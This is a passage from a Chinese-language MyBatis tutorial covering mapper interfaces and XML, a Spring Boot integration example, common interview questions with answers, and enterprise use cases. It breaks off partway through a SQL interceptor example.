    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> username;
    <span class="hljs-keyword">private</span> Integer age;
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> email;

    <span class="hljs-comment">// 无参构造、全参构造、getter/setter、toString</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">User</span><span class="hljs-params">()</span> </span>{}
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">User</span><span class="hljs-params">(Long id, <span class="hljs-type">String</span> username, Integer age, <span class="hljs-type">String</span> email)</span> </span>{
        <span class="hljs-keyword">this</span>.id = id;
        <span class="hljs-keyword">this</span>.username = username;
        <span class="hljs-keyword">this</span>.age = age;
        <span class="hljs-keyword">this</span>.email = email;
    }
    <span class="hljs-comment">// getter/setter 省略</span>
    @<span class="hljs-function">Override
    <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-string">"User{"</span> +
                <span class="hljs-string">"id="</span> + id +
                <span class="hljs-string">", username='"</span> + username + <span class="hljs-string">'''</span> +
                <span class="hljs-string">", age="</span> + age +
                <span class="hljs-string">", email='"</span> + email + <span class="hljs-string">'''</span> +
                <span class="hljs-string">'}'</span>;
    }
}
</code></pre>
<h3 data-id="heading-4">4. Mapper 接口（UserMapper.java）</h3>
<p>java</p>
<p>运行</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">interface</span> <span class="hljs-selector-tag">UserMapper</span> {
    <span class="hljs-comment">// 根据ID查询用户</span>
    <span class="hljs-selector-tag">User</span> <span class="hljs-selector-tag">selectUserById</span>(Long id);
    <span class="hljs-comment">// 新增用户</span>
    <span class="hljs-selector-tag">int</span> <span class="hljs-selector-tag">insertUser</span>(User user);
    <span class="hljs-comment">// 更新用户</span>
    <span class="hljs-selector-tag">int</span> <span class="hljs-selector-tag">updateUser</span>(User user);
    <span class="hljs-comment">// 删除用户</span>
    <span class="hljs-selector-tag">int</span> <span class="hljs-selector-tag">deleteUser</span>(Long id);
    <span class="hljs-comment">// 条件查询（动态SQL）</span>
    <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">User</span>&gt; <span class="hljs-selector-tag">selectUserByCondition</span>(<span class="hljs-variable">@Param</span>(<span class="hljs-string">"username"</span>) String username, <span class="hljs-variable">@Param</span>(<span class="hljs-string">"age"</span>) Integer age);
}
</code></pre>
<h3 data-id="heading-5">5. Mapper XML 文件（UserMapper.xml）</h3>
<p>xml</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span>?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span>
        <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">"-//mybatis.org//DTD Mapper 3.0//EN"</span>
        <span class="hljs-string">"https://mybatis.org/dtd/mybatis-3-mapper.dtd"</span>&gt;</span>
<span class="hljs-comment">&lt;!-- namespace 对应 Mapper 接口全路径 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">"com.example.mapper.UserMapper"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 结果映射（字段名与属性名不一致时使用） --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"UserResultMap"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"com.example.entity.User"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">"id"</span> <span class="hljs-attr">property</span>=<span class="hljs-string">"id"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">"username"</span> <span class="hljs-attr">property</span>=<span class="hljs-string">"username"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">"age"</span> <span class="hljs-attr">property</span>=<span class="hljs-string">"age"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">"email"</span> <span class="hljs-attr">property</span>=<span class="hljs-string">"email"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- 查询单个 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"selectUserById"</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">"UserResultMap"</span>&gt;</span>
        SELECT id, username, age, email FROM user WHERE id = #{id}
    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- 新增 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"insertUser"</span> <span class="hljs-attr">useGeneratedKeys</span>=<span class="hljs-string">"true"</span> <span class="hljs-attr">keyProperty</span>=<span class="hljs-string">"id"</span>&gt;</span>
        INSERT INTO user (username, age, email) VALUES (#{username}, #{age}, #{email})
    <span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- 更新 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"updateUser"</span>&gt;</span>
        UPDATE user
        <span class="hljs-tag">&lt;<span class="hljs-name">set</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">"username != null and username != ''"</span>&gt;</span>username = #{username},<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">"age != null"</span>&gt;</span>age = #{age},<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">"email != null and email != ''"</span>&gt;</span>email = #{email}<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">set</span>&gt;</span>
        WHERE id = #{id}
    <span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- 删除 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">delete</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"deleteUser"</span>&gt;</span>
        DELETE FROM user WHERE id = #{id}
    <span class="hljs-tag">&lt;/<span class="hljs-name">delete</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- 动态条件查询 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"selectUserByCondition"</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">"UserResultMap"</span>&gt;</span>
        SELECT id, username, age, email FROM user
        <span class="hljs-tag">&lt;<span class="hljs-name">where</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">"username != null and username != ''"</span>&gt;</span>AND username LIKE CONCAT('%', #{username}, '%')<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">"age != null"</span>&gt;</span>AND age = #{age}<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">where</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span>
</code></pre>
<h3 data-id="heading-6">6. 工具类（MyBatisUtil.java）</h3>
<p>java</p>
<p>运行</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.apache.ibatis.io.Resources;
<span class="hljs-keyword">import</span> org.apache.ibatis.session.SqlSession;
<span class="hljs-keyword">import</span> org.apache.ibatis.session.SqlSessionFactory;
<span class="hljs-keyword">import</span> org.apache.ibatis.session.SqlSessionFactoryBuilder;
<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.io.InputStream;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyBatisUtil</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> SqlSessionFactory sqlSessionFactory;

    <span class="hljs-comment">// 初始化 SqlSessionFactory</span>
    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">String</span> <span class="hljs-variable">resource</span> <span class="hljs-operator">=</span> <span class="hljs-string">"mybatis-config.xml"</span>;
            <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Resources.getResourceAsStream(resource);
            sqlSessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SqlSessionFactoryBuilder</span>().build(inputStream);
        } <span class="hljs-keyword">catch</span> (IOException e) {
            e.printStackTrace();
        }
    }

    <span class="hljs-comment">// 获取 SqlSession（自动提交事务）</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SqlSession <span class="hljs-title function_">getSqlSession</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sqlSessionFactory.openSession(<span class="hljs-literal">true</span>);
    }
}
</code></pre>
<h3 data-id="heading-7">7. 测试类</h3>
<p>java</p>
<p>运行</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.example.entity.User;
<span class="hljs-keyword">import</span> com.example.mapper.UserMapper;
<span class="hljs-keyword">import</span> org.apache.ibatis.session.SqlSession;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyBatisTest</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 1. 获取 SqlSession</span>
        <span class="hljs-keyword">try</span> (<span class="hljs-type">SqlSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> MyBatisUtil.getSqlSession()) {
            <span class="hljs-type">UserMapper</span> <span class="hljs-variable">userMapper</span> <span class="hljs-operator">=</span> session.getMapper(UserMapper.class);

            <span class="hljs-comment">// 新增用户</span>
            <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-literal">null</span>, <span class="hljs-string">"zhangsan"</span>, <span class="hljs-number">20</span>, <span class="hljs-string">"zhangsan@163.com"</span>);
            userMapper.insertUser(user);
            System.out.println(<span class="hljs-string">"新增用户ID："</span> + user.getId());

            <span class="hljs-comment">// 查询单个用户</span>
            <span class="hljs-type">User</span> <span class="hljs-variable">queryUser</span> <span class="hljs-operator">=</span> userMapper.selectUserById(user.getId());
            System.out.println(<span class="hljs-string">"查询到的用户："</span> + queryUser);

            <span class="hljs-comment">// 更新用户</span>
            queryUser.setAge(<span class="hljs-number">21</span>);
            userMapper.updateUser(queryUser);
            System.out.println(<span class="hljs-string">"更新后的用户："</span> + userMapper.selectUserById(user.getId()));

            <span class="hljs-comment">// 条件查询</span>
            List&lt;User&gt; userList = userMapper.selectUserByCondition(<span class="hljs-string">"zhang"</span>, <span class="hljs-literal">null</span>);
            System.out.println(<span class="hljs-string">"条件查询结果："</span> + userList);

            <span class="hljs-comment">// 删除用户</span>
            userMapper.deleteUser(user.getId());
            System.out.println(<span class="hljs-string">"删除后查询："</span> + userMapper.selectUserById(user.getId()));
        }
    }
}
</code></pre>
<h3 data-id="heading-8">8. Spring Boot 整合 MyBatis（企业主流）</h3>
<h4 data-id="heading-9">（1）application.yml 配置</h4>
<p>yaml</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">spring:</span>
  <span class="hljs-attr">datasource:</span>
    <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/test?useSSL=false&amp;serverTimezone=UTC</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>
    <span class="hljs-attr">password:</span> <span class="hljs-number">123456</span>
    <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.cj.jdbc.Driver</span>
<span class="hljs-attr">mybatis:</span>
  <span class="hljs-attr">mapper-locations:</span> <span class="hljs-string">classpath:mapper/*.xml</span>  <span class="hljs-comment"># Mapper XML 路径</span>
  <span class="hljs-attr">type-aliases-package:</span> <span class="hljs-string">com.example.entity</span>  <span class="hljs-comment"># 实体类别名包</span>
  <span class="hljs-attr">configuration:</span>
    <span class="hljs-attr">map-underscore-to-camel-case:</span> <span class="hljs-literal">true</span>  <span class="hljs-comment"># 开启下划线转驼峰</span>
</code></pre>
<h4 data-id="heading-10">（2）启动类添加注解</h4>
<p>java</p>
<p>运行</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> org.<span class="hljs-property">mybatis</span>.<span class="hljs-property">spring</span>.<span class="hljs-property">annotation</span>.<span class="hljs-property">MapperScan</span>;
<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">boot</span>.<span class="hljs-property">SpringApplication</span>;
<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">boot</span>.<span class="hljs-property">autoconfigure</span>.<span class="hljs-property">SpringBootApplication</span>;

<span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-meta">@MapperScan</span>(<span class="hljs-string">"com.example.mapper"</span>)  <span class="hljs-comment">// 扫描 Mapper 接口</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyBatisApplication</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) {
        <span class="hljs-title class_">SpringApplication</span>.<span class="hljs-title function_">run</span>(<span class="hljs-title class_">MyBatisApplication</span>.<span class="hljs-property">class</span>, args);
    }
}
</code></pre>
<h4 data-id="heading-11">（3）Service 层调用</h4>
<p>java</p>
<p>运行</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> com.<span class="hljs-property">example</span>.<span class="hljs-property">entity</span>.<span class="hljs-property">User</span>;
<span class="hljs-keyword">import</span> com.<span class="hljs-property">example</span>.<span class="hljs-property">mapper</span>.<span class="hljs-property">UserMapper</span>;
<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">stereotype</span>.<span class="hljs-property">Service</span>;
<span class="hljs-keyword">import</span> javax.<span class="hljs-property">annotation</span>.<span class="hljs-property">Resource</span>;
<span class="hljs-keyword">import</span> java.<span class="hljs-property">util</span>.<span class="hljs-property">List</span>;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">UserMapper</span> userMapper;

    <span class="hljs-keyword">public</span> <span class="hljs-title class_">User</span> <span class="hljs-title function_">getUserById</span>(<span class="hljs-params">Long id</span>) {
        <span class="hljs-keyword">return</span> userMapper.<span class="hljs-title function_">selectUserById</span>(id);
    }

    <span class="hljs-keyword">public</span> int <span class="hljs-title function_">addUser</span>(<span class="hljs-params">User user</span>) {
        <span class="hljs-keyword">return</span> userMapper.<span class="hljs-title function_">insertUser</span>(user);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">User</span>&gt; <span class="hljs-title function_">getUsersByCondition</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> username, Integer age</span>) {
        <span class="hljs-keyword">return</span> userMapper.<span class="hljs-title function_">selectUserByCondition</span>(username, age);
    }
}
</code></pre>
<h2 data-id="heading-12">二、企业高频面试题</h2>
<h3 data-id="heading-13">基础概念</h3>
<ol>
<li>
<p><strong>MyBatis 是什么？它和 JDBC、Hibernate 的区别？</strong></p>
<ul>
<li>
<p>答：MyBatis 是半自动化 ORM 框架，简化 JDBC 操作，支持自定义 SQL；</p>
<ul>
<li>JDBC：手动写 SQL、处理连接、结果集，代码冗余；</li>
<li>Hibernate：全自动化 ORM，无需写 SQL，适配多数据库，但复杂 SQL 优化困难；</li>
<li>MyBatis：平衡灵活性和开发效率，支持自定义 SQL，适合复杂业务场景。</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>MyBatis 的核心组件有哪些？</strong></p>
<ul>
<li>
<p>答：</p>
<ul>
<li><code>SqlSessionFactory</code>：创建 SqlSession 的工厂，全局唯一；</li>
<li><code>SqlSession</code>：与数据库的会话，封装 CRUD 操作；</li>
<li><code>Mapper 接口</code>：映射 SQL 的接口，MyBatis 动态代理实现；</li>
<li><code>Configuration</code>：MyBatis 核心配置类，存储全局配置；</li>
<li><code>Executor</code>：执行器，处理 SQL 执行（Simple/Reuse/Batch）。</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>MyBatis 中 #{} 和 ${} 的区别？</strong></p>
<ul>
<li>
<p>答：</p>
<ul>
<li><code>#{}</code>：参数预编译，防止 SQL 注入，底层用 PreparedStatement；</li>
<li><code>${}</code>：字符串拼接，直接替换参数，有注入风险，适用于表名 / 列名动态替换（如 ORDER BY ${column}）。</li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 data-id="heading-14">映射与 SQL</h3>
<ol start="4">
<li>
<p><strong>MyBatis 如何解决字段名与实体类属性名不一致的问题？</strong></p>
<ul>
<li>
<p>答：</p>
<ul>
<li>方式 1：SQL 中使用别名（<code>SELECT user_name AS username FROM user</code>）；</li>
<li>方式 2：使用 <code>&lt;resultMap&gt;</code> 手动映射字段与属性；</li>
<li>方式 3：开启全局配置 <code>map-underscore-to-camel-case: true</code>（下划线转驼峰）。</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>MyBatis 的动态 SQL 有哪些标签？</strong></p>
<ul>
<li>答：<code>&lt;if&gt;</code>、<code>&lt;where&gt;</code>、<code>&lt;set&gt;</code>、<code>&lt;choose&gt;/&lt;when&gt;/&lt;otherwise&gt;</code>、<code>&lt;foreach&gt;</code>、<code>&lt;trim&gt;</code> 等，用于动态拼接 SQL，适配多条件查询、批量操作等场景。</li>
</ul>
</li>
<li>
<p><strong>MyBatis 如何实现分页？</strong></p>
<ul>
<li>
<p>答：</p>
<ul>
<li>基础方式：SQL 中拼接 LIMIT #{offset}, #{size}；</li>
<li>插件方式：使用 PageHelper 插件（企业主流），自动拦截 SQL 并添加分页条件；</li>
<li>手动分页：查询总数 + 分页查询结果。</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>MyBatis 中的一级缓存和二级缓存有什么区别？</strong></p>
<ul>
<li>
<p>答：</p>
<ul>
<li>一级缓存：SqlSession 级别，默认开启，同一个 SqlSession 内查询相同 SQL 会缓存结果，关闭 SqlSession 缓存失效；</li>
<li>二级缓存：Mapper 级别，需手动开启（<code>&lt;cache/&gt;</code>），多个 SqlSession 共享缓存，查询结果需实现 Serializable 接口；</li>
<li>注意：二级缓存慎用，多表关联查询易导致数据不一致。</li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 data-id="heading-15">高级应用</h3>
<ol start="8">
<li>
<p><strong>MyBatis 如何实现多表关联查询（一对一、一对多）？</strong></p>
<ul>
<li>
<p>答：</p>
<ul>
<li>
<p>一对一：使用 <code>&lt;association&gt;</code> 标签，映射关联对象（如 User 关联 Order）；</p>
</li>
<li>
<p>一对多：使用 <code>&lt;collection&gt;</code> 标签，映射关联集合（如 User 关联多个 Order）；</p>
</li>
<li>
<p>示例：</p>
<p>xml</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"UserOrderMap"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"User"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">"user_id"</span> <span class="hljs-attr">property</span>=<span class="hljs-string">"id"</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">"username"</span> <span class="hljs-attr">property</span>=<span class="hljs-string">"username"</span>/&gt;</span>
    <span class="hljs-comment">&lt;!-- 一对多 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">collection</span> <span class="hljs-attr">property</span>=<span class="hljs-string">"orders"</span> <span class="hljs-attr">ofType</span>=<span class="hljs-string">"Order"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">"order_id"</span> <span class="hljs-attr">property</span>=<span class="hljs-string">"id"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">"order_no"</span> <span class="hljs-attr">property</span>=<span class="hljs-string">"orderNo"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">collection</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>
</code></pre>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>MyBatis 的插件原理是什么？如何自定义插件？</strong></p>
<ul>
<li>
<p>答：</p>
<ul>
<li>
<p>原理：基于 JDK 动态代理，拦截四大对象（Executor、StatementHandler、ParameterHandler、ResultSetHandler）的方法；</p>
</li>
<li>
<p>自定义插件步骤：</p>
<ol>
<li>实现 <code>Interceptor</code> 接口，重写 <code>intercept()</code> 方法；</li>
<li>添加 <code>@Intercepts</code> 注解指定拦截的方法；</li>
<li>配置插件到 MyBatis 核心配置中。</li>
</ol>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>MyBatis 中如何处理事务？</strong></p>
<ul>
<li>
<p>答：</p>
<ul>
<li>原生 MyBatis：通过 <code>SqlSession</code> 控制（<code>openSession(false)</code> 手动提交，<code>commit()</code>/<code>rollback()</code>）；</li>
<li>Spring 整合：使用 Spring 事务管理（<code>@Transactional</code> 注解），MyBatis 适配 Spring 事务管理器。</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>企业中如何优化 MyBatis 性能？</strong></p>
<ul>
<li>
<p>答：</p>
<ul>
<li>合理使用缓存（一级缓存为主，二级缓存慎用）；</li>
<li>避免 N+1 查询问题（使用关联查询、延迟加载）；</li>
<li>批量操作使用 <code>foreach</code> + Batch 执行器；</li>
<li>关闭不必要的日志（如 DEBUG 级别）；</li>
<li>使用 ResultMap 代替 ResultType，减少字段映射开销；</li>
<li>分页查询限制返回行数，避免全表扫描。</li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 data-id="heading-16">整合与实战</h3>
<ol start="12">
<li>
<p><strong>Spring Boot 整合 MyBatis 的核心步骤？</strong></p>
<ul>
<li>
<p>答：</p>
<ol>
<li>引入 MyBatis Starter 依赖；</li>
<li>配置数据源和 MyBatis 核心参数（mapper 路径、别名等）；</li>
<li>使用 <code>@MapperScan</code> 扫描 Mapper 接口；</li>
<li>编写 Mapper 接口和 XML（或注解）；</li>
<li>Service 层注入 Mapper 调用。</li>
</ol>
</li>
</ul>
</li>
<li>
<p><strong>MyBatis 注解开发和 XML 开发的优缺点？</strong></p>
<ul>
<li>
<p>答：</p>
<ul>
<li>注解：简洁，适合简单 SQL，无需维护 XML；缺点：复杂 SQL、动态 SQL 可读性差，不易调试；</li>
<li>XML：适合复杂 SQL、动态 SQL，易维护、易调试；缺点：文件较多，配置稍繁琐；</li>
<li>企业实践：简单 CRUD 用注解，复杂 SQL 用 XML。</li>
</ul>
</li>
</ul>
</li>
</ol>
<h2 data-id="heading-17">三、企业应用场景</h2>
<h3 data-id="heading-18">1. 核心业务开发（所有后端项目）</h3>
<ul>
<li><strong>场景</strong>：用户模块、订单模块、商品模块等基础 CRUD 操作；</li>
<li><strong>价值</strong>：替代原生 JDBC，减少重复代码，自定义 SQL 适配业务需求（如复杂条件查询、联表查询）。</li>
</ul>
<h3 data-id="heading-19">2. 动态条件查询（电商 / 后台管理系统）</h3>
<ul>
<li><strong>场景</strong>：电商平台的商品筛选（价格区间、分类、销量排序）、后台管理系统的用户列表查询（多条件组合）；</li>
<li><strong>实现</strong>：使用 <code>&lt;if&gt;</code>、<code>&lt;where&gt;</code>、<code>&lt;choose&gt;</code> 等动态 SQL 标签，按需拼接查询条件。</li>
</ul>
<h3 data-id="heading-20">3. 批量操作（数据导入 / 订单批量处理）</h3>
<ul>
<li>
<p><strong>场景</strong>：Excel 数据导入（批量新增用户 / 商品）、订单批量发货、批量删除无效数据；</p>
</li>
<li>
<p><strong>实现</strong>：</p>
<p>xml</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-operator">&lt;</span><span class="hljs-keyword">insert</span> id<span class="hljs-operator">=</span>"batchInsertUser"<span class="hljs-operator">&gt;</span>
    <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">user</span> (username, age, email) <span class="hljs-keyword">VALUES</span>
    <span class="hljs-operator">&lt;</span>foreach collection<span class="hljs-operator">=</span>"list" item<span class="hljs-operator">=</span>"item" separator<span class="hljs-operator">=</span>","<span class="hljs-operator">&gt;</span>
        (#{item.username}, #{item.age}, #{item.email})
    <span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>foreach<span class="hljs-operator">&gt;</span>
<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span><span class="hljs-keyword">insert</span><span class="hljs-operator">&gt;</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-21">4. 多表关联查询（复杂业务场景）</h3>
<ul>
<li><strong>场景</strong>：电商订单详情（关联用户、商品、地址表）、财务报表（关联订单、支付、退款表）；</li>
<li><strong>实现</strong>：使用 <code>&lt;association&gt;</code>（一对一）、<code>&lt;collection&gt;</code>（一对多）实现关联映射，避免多次查询。</li>
</ul>
<h3 data-id="heading-22">5. 分页查询（列表展示）</h3>
<ul>
<li>
<p><strong>场景</strong>：商品列表、订单列表、用户列表等分页展示；</p>
</li>
<li>
<p><strong>实现</strong>：结合 PageHelper 插件，一行代码实现分页：</p>
<p>java</p>
<p>运行</p>
<pre><code class="hljs language-ini" lang="ini">PageHelper.startPage(1, 10)<span class="hljs-comment">; // 第1页，每页10条</span>
List&lt;User&gt; <span class="hljs-attr">userList</span> = userMapper.selectUserByCondition(null, null)<span class="hljs-comment">;</span>
PageInfo&lt;User&gt; <span class="hljs-attr">pageInfo</span> = new PageInfo&lt;&gt;(userList)<span class="hljs-comment">;</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-23">6. 存储过程调用（金融 / 传统行业）</h3>
<ul>
<li>
<p><strong>场景</strong>：金融行业的计息计算、传统行业的报表统计（存储过程封装复杂逻辑）；</p>
</li>
<li>
<p><strong>实现</strong>：</p>
<p>xml</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-operator">&lt;</span><span class="hljs-keyword">select</span> id<span class="hljs-operator">=</span>"callProcedure" statementType<span class="hljs-operator">=</span>"CALLABLE"<span class="hljs-operator">&gt;</span>
    {<span class="hljs-keyword">CALL</span> get_user_count(#{count, mode<span class="hljs-operator">=</span><span class="hljs-keyword">OUT</span>, jdbcType<span class="hljs-operator">=</span><span class="hljs-type">INTEGER</span>})}
<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span><span class="hljs-keyword">select</span><span class="hljs-operator">&gt;</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-24">7. 读写分离（高并发场景）</h3>
<ul>
<li><strong>场景</strong>：电商秒杀、直播带货等高并发场景，读请求走从库，写请求走主库；</li>
<li><strong>实现</strong>：结合 MyCat/Sharding-JDBC 中间件，MyBatis 配置多数据源，通过插件动态切换数据源。</li>
</ul>
<h3 data-id="heading-25">8. 自定义插件（通用功能扩展）</h3>
<ul>
<li>
<p><strong>场景</strong>：SQL 执行耗时监控、数据权限过滤（如按部门过滤数据）、防全表更新 / 删除；</p>
</li>
<li>
<p><strong>示例</strong>：自定义插件拦截 SQL，禁止不带 WHERE 条件的 UPDATE/DELETE：</p>
<p>java</p>
<p>运行</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@Intercepts</span>({<span class="hljs-variable">@Signature</span>(type = StatementHandler.class, method = <span class="hljs-string">"prepare"</span>, args = {Connection.class, Integer.class})})
public class SqlInterceptor implements Interceptor {
    <span class="hljs-variable">@Override</span>
    public Object <span class="hljs-built_in">intercept</span>(Invocation invocation) throws Throwable {
        <span class="hljs-selector-tag">StatementHandler</span> <span class="hljs-selector-tag">statementHandler</span> = (StatementHandler) <span class="hljs-selector-tag">invocation</span><span class="hljs-selector-class">.getTarget</span>();
        <span class="hljs-selector-tag">BoundSql</span> <span class="hljs-selector-tag">boundSql</span> = <span class="hljs-selector-tag">statementHandler</span><span class="hljs-selector-class">.getBoundSql</span>();
